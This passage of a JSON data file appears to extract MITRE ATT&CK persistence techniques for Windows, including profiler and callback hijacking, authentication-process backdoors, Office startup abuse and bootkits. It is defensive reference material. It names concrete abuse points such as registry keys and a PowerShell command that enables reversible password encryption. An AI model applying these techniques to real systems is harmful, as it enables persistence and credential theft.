    "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.[1][2]The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where aComponent Object Model(COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.[2]Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook andImpair Defensesprovided by .NET processes.[3][4][5][6][7]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:04.748913"
  },
  {
    "technique_id": "T1574.013",
    "name": "KernelCallbackTable",
    "description": "Adversaries may abuse theKernelCallbackTableof a process to hijack its execution flow in order to run their own payloads.[1][2]TheKernelCallbackTablecan be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process onceuser32.dllis loaded.[3]An adversary may hijack the execution flow of a process using theKernelCallbackTableby replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such asReflective Code LoadingorProcess Injectioninto another process.A pointer to the memory address of theKernelCallbackTablecan be obtained by locating the PEB (ex: via a call to theNtQueryInformationProcess()Native APIfunction).[4]Once the pointer is located, theKernelCallbackTablecan be duplicated, and a function in the table (e.g.,fnCOPYDATA) set to the address of a malicious payload (ex: viaWriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.[1]The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, theKernelCallbackTablemay also be restored to its original state by the rest of the malicious payload.[1]Use of theKernelCallbackTableto hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:08.077936"
  },
  {
    "technique_id": "T1574.014",
    "name": "AppDomainManager",
    "description": "Adversaries may execute their own malicious payloads by hijacking how the .NETAppDomainManagerloads assemblies. The .NET framework uses theAppDomainManagerclass to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exeor.dllbinaries compiled to run as .NET code) may be loaded into an application domain as executable code.[1]Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.[2][3][4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:11.414367"
  },
  {
    "technique_id": "T1556",
    "name": "Modify Authentication Process",
    "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without usingValid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:14.746093",
    "subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ]
  },
  {
    "technique_id": "T1556.001",
    "name": "Domain Controller Authentication",
    "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any userâ€™s account and/or credentials (ex:Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:18.076381"
  },
  {
    "technique_id": "T1556.002",
    "name": "Password Filter DLL",
    "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:21.407843"
  },
  {
    "technique_id": "T1556.005",
    "name": "Reversible Encryption",
    "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. TheAllowReversiblePasswordEncryptionproperty specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.[1]If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structureuserParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also fromuserParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.[2][3]An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectoryPowerShellmodule. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.[4]In PowerShell, an adversary may make associated changes to user settings using commands similar toSet-ADUser -AllowReversiblePasswordEncryption $true.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:24.832036"
  },
  {
    "technique_id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such asMulti-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.[1][2]For example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.[3]Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:28.193741"
  },
  {
    "technique_id": "T1556.007",
    "name": "Hybrid Identity",
    "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID[1]:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloudPass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active DirectoryActive Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra IDAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid usersâ€™ identity and privileges.By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into theAzureADConnectAuthenticationAgentServiceprocess that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.[2][3]In environments using AD FS, an adversary may edit theMicrosoft.IdentityServer.Servicehostconfiguration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.[4]In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.[5]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:31.557844"
  },
  {
    "technique_id": "T1556.008",
    "name": "Network Provider DLL",
    "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.[1]During the logon process, Winlogon (the interactive logon module) sends credentials to the localmpnotify.exeprocess via RPC. Thempnotify.exeprocess then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.[2][3][4]Adversaries can configure a malicious network provider DLL to receive credentials frommpnotify.exe.[5]Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via theNPLogonNotify()function.[4]Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:34.881922"
  },
  {
    "technique_id": "T1112",
    "name": "Modify Registry",
    "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utilityRegmay be used for local or remote Registry modification.[1]Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.The Registry may be modified in order to hide configuration information or malicious payloads viaObfuscated Files or Information.[2][3][4][5]The Registry may also be modified toImpair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.[6][2]The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.[7]OftenValid Accountsare required, along with access to the remote system'sSMB/Windows Admin Sharesfor RPC communication.Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read viaRegor other utilities using the Win32 API.[8]Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.[9][10]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:38.375719",
    "subtechniques": []
  },
  {
    "technique_id": "T1137",
    "name": "Office Application Startup",
    "description": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.[1]These persistence mechanisms can work within Outlook or be used through Office 365.[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:41.721299",
    "subtechniques": [
      {
        "id": "T1137.001",
        "name": "Office Template Macros"
      },
      {
        "id": "T1137.002",
        "name": "Office Test"
      },
      {
        "id": "T1137.003",
        "name": "Outlook Forms"
      },
      {
        "id": "T1137.004",
        "name": "Outlook Home Page"
      },
      {
        "id": "T1137.005",
        "name": "Outlook Rules"
      },
      {
        "id": "T1137.006",
        "name": "Add-ins"
      }
    ]
  },
  {
    "technique_id": "T1137.001",
    "name": "Office Template Macros",
    "description": "Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system. Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.[1]Office Visual Basic for Applications (VBA) macros[2]can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.[3][4]Shared templates may also be stored and pulled from remote locations.[5]Word Normal.dotm location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotmExcel Personal.xlsb location:C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSBAdversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm underC:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\, or by modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup. To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.[5]An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:45.056210"
  },
  {
    "technique_id": "T1137.002",
    "name": "Office Test",
    "description": "Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.[1][2]There exist user and global Registry keys for the Office Test feature, such as:HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\PerfHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\PerfAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:48.448140"
  },
  {
    "technique_id": "T1137.003",
    "name": "Outlook Forms",
    "description": "Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system. Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.[1]Once malicious forms have been added to the userâ€™s mailbox, they will be loaded when Outlook is started. Malicious forms will execute when an adversary sends a specifically crafted email to the user.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:51.799145"
  },
  {
    "technique_id": "T1137.004",
    "name": "Outlook Home Page",
    "description": "Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.[1]Once malicious home pages have been added to the userâ€™s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:55.141846"
  },
  {
    "technique_id": "T1137.005",
    "name": "Outlook Rules",
    "description": "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.[1]Once malicious rules have been added to the userâ€™s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.[1]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:58.503600"
  },
  {
    "technique_id": "T1137.006",
    "name": "Add-ins",
    "description": "Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.[1]There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins.[2][3]Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Office Application Startup",
    "parent_technique_id": "T1137",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:01.835919"
  },
  {
    "technique_id": "T1653",
    "name": "Power Settings",
    "description": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.[1]Adversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.[2][3]For example,powercfgcontrols all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.[4]Adversaries may also extend system lock screen timeout settings.[5]Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.[6]Aware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.[7]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:05.165770",
    "subtechniques": []
  },
  {
    "technique_id": "T1542",
    "name": "Pre-OS Boot",
    "description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:08.535758",
    "subtechniques": [
      {
        "id": "T1542.001",
        "name": "System Firmware"
      },
      {
        "id": "T1542.002",
        "name": "Component Firmware"
      },
      {
        "id": "T1542.003",
        "name": "Bootkit"
      }
    ]
  },
  {
    "technique_id": "T1542.001",
    "name": "System Firmware",
    "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.[1][2][3]System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:11.936791"
  },
  {
    "technique_id": "T1542.002",
    "name": "Component Firmware",
    "description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar toSystem Firmwarebut conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:15.260649"
  },
  {
    "technique_id": "T1542.003",
    "name": "Bootkit",
    "description": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).[1]The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.[2]The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.[3][4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Pre-OS Boot",
    "parent_technique_id": "T1542",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:18.613320"
  },
  {
    "technique_id": "T1053",
    "name": "Scheduled Task/Job",
    "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.[1]Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar toSystem Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:21.844370",
    "subtechniques": [
      {
        "id": "T1053.002",
        "name": "At"
      },
      {
        "id": "T1053.005",
        "name": "Scheduled Task"
      }
    ]
  },
  {
    "technique_id": "T1053.002",
    "name": "At",
    "description": "Adversaries may abuse theatutility to perform task scheduling for initial or recurring execution of malicious code. Theatutility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor ofScheduled Task'sschtasksin Windows environments, usingatrequires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running theatcommand, adversaries may also schedule a task withatby directly leveraging theWindows Management InstrumentationWin32_ScheduledJobWMI class.[1]On Linux and macOS,atmay be invoked by the superuser as well as any users added to theat.allowfile. If theat.allowfile does not exist, theat.denyfile is checked. Every username not listed inat.denyis allowed to invokeat. If theat.denyexists and is empty, global use ofatis permitted. If neither file exists (which is often the baseline) only the superuser is allowed to useat.[2]Adversaries may useatto execute programs at system startup or on a scheduled basis forPersistence.atcan also be abused to conduct remoteExecutionas part ofLateral Movementand/or to run a process under the context of a specified account (such as SYSTEM).In Linux environments, adversaries may also abuseatto break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly,atmay also be used forPrivilege Escalationif the binary is allowed to run as superuser viasudo.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Scheduled Task/Job",
    "parent_technique_id": "T1053",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:00:25.220850"
  },
  {
    "technique_id": "T1053.005",
    "name": "Scheduled Task",
